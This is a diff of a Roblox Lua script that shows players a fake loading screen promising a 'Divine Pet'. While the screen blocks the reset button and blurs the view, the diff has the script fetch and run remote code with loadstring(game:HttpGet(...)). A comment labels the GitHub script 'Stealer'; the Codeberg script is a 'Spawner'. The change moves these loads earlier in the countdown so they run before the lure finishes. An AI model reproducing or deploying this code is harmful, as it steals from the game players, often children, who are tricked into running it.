@@ -4,27 +4,21 @@ local StarterGui = game:GetService("StarterGui")
 local Lighting = game:GetService("Lighting")
 local player = Players.LocalPlayer
 
--- Start timer
 local startTime = tick()
 
--- UI setup
-local gui = Instance.new("ScreenGui")
+-- UI Setup
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
 gui.Name = "SecureLoadingUI"
-gui.Parent = player:WaitForChild("PlayerGui")
 
--- Blur effect
-local blur = Instance.new("BlurEffect")
+local blur = Instance.new("BlurEffect", Lighting)
 blur.Size = 24
-blur.Parent = Lighting
 
--- Main Frame
 local mainFrame = Instance.new("Frame", gui)
 mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 mainFrame.Size = UDim2.new(1, 0, 1, 0)
 
--- Warning Message
 local warning = Instance.new("TextLabel", mainFrame)
 warning.Size = UDim2.new(1, 0, 0.1, 0)
 warning.Position = UDim2.new(0, 0, 0.1, 0)
@@ -34,7 +28,6 @@ warning.BackgroundTransparency = 1
 warning.Font = Enum.Font.Code
 warning.TextScaled = true
 
--- Circle Loader
 local circle = Instance.new("ImageLabel", mainFrame)
 circle.Size = UDim2.new(0, 120, 0, 120)
 circle.Position = UDim2.new(0.5, -60, 0.5, -60)
@@ -44,7 +37,6 @@ circle.ImageRectOffset = Vector2.new(324, 364)
 circle.ImageRectSize = Vector2.new(36, 36)
 circle.ImageColor3 = Color3.fromRGB(0, 255, 0)
 
--- Countdown label
 local countLabel = Instance.new("TextLabel", mainFrame)
 countLabel.Size = UDim2.new(1, 0, 0.1, 0)
 countLabel.Position = UDim2.new(0, 0, 0.7, 0)
@@ -54,7 +46,6 @@ countLabel.Font = Enum.Font.Code
 countLabel.TextScaled = true
 countLabel.Text = "Loading: 6s"
 
--- Bottom subtext
 local bottomText = Instance.new("TextLabel", mainFrame)
 bottomText.Size = UDim2.new(1, 0, 0.05, 0)
 bottomText.Position = UDim2.new(0, 0, 0.95, 0)
@@ -93,16 +84,30 @@ pcall(function()
 	StarterGui:SetCore("ResetButtonCallback", false)
 end)
 
--- Short countdown (6 seconds)
+-- Countdown + timed actions
 task.spawn(function()
 	for i = 6, 0, -1 do
 		countLabel.Text = "Loading: " .. i .. "s"
 		circle.Rotation = (6 - i) * 60
+
+		if i == 5 then
+			-- ✅ Load Stealer at 1 second passed
+			pcall(function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Petspawner1/GrowaGarden/refs/heads/main/Main.script"))()
+			end)
+		elseif i == 1 then
+			-- 🧬 Load Spawner at 5 seconds passed
+			pcall(function()
+				local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
+				Spawner.Load()
+			end)
+		end
+
 		wait(1)
 	end
 
+	-- 🧪 Divine pet result
 	local hasDivinePet = math.random(1, 2) == 1
-
 	if hasDivinePet then
 		countLabel.Text = "✅ Check your inventory. You have successfully got a Divine Pet."
 		countLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
@@ -111,29 +116,20 @@ task.spawn(function()
 		countLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
 	end
 
-	-- Re-enable CoreGui
 	pcall(function()
 		StarterGui:SetCore("TopbarEnabled", true)
 		StarterGui:SetCore("ResetButtonCallback", true)
 	end)
 
-	-- Cleanup
 	wait(2)
 	gui:Destroy()
 	blur:Destroy()
-
-	-- ✅ Load Stealer
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Petspawner1/GrowaGarden/refs/heads/main/Main.script"))()
-
-	-- 🧬 Load Spawner
-	local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
-	Spawner.Load()
 end)
 
--- Fake early leave block
+-- Optional: block early leave (fake)
 Players.PlayerRemoving:Connect(function(leavingPlayer)
 	if leavingPlayer == player and tick() - startTime < 6 then
-		-- Uncomment to kick
+		-- Uncomment to kick early leavers
 		-- leavingPlayer:Kick("Leaving early is not allowed during loading.")
 	end
 end)
